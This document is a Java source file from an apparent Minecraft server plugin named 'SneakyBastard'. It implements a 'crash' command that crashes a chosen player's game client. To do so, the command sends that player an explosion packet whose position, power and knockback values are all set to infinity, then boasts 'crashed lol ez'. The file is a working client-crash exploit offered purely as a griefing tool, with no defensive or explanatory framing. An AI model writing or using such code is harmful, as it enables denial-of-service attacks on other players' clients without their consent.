package net.blackofworld.SneakyBastard.Commands.Player;

import net.blackofworld.SneakyBastard.Extensions.PlayerExt;
import lombok.experimental.ExtensionMethod;
import net.blackofworld.SneakyBastard.Command.CommandBase;
import net.blackofworld.SneakyBastard.Command.CommandCategory;
import net.blackofworld.SneakyBastard.Command.CommandInfo;
import net.minecraft.network.protocol.game.ClientboundExplodePacket;
import net.minecraft.world.phys.Vec3;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import java.util.ArrayList;
import java.util.List;

@CommandInfo(command = "crash", description = "Crashes the player", Syntax = "<player>", category = CommandCategory.Player, requiredArgs = 1)
@ExtensionMethod({Player.class, PlayerExt.class})
public final class Crash extends CommandBase {
    @Override
    public void Execute(Player p, ArrayList<String> args) {
        Player pp = Bukkit.getPlayerExact(args.get(0));
        if (pp == null) {
            p.sendHelp(this, ChatColor.RED + "No player with such name!");
            return;
        }
        ClientboundExplodePacket packet = new ClientboundExplodePacket(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Float.POSITIVE_INFINITY, List.of(), new Vec3(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY));
        pp.SendPacket(packet);
        p.Reply(pp.getName() + " crashed lol ez");
    }
}
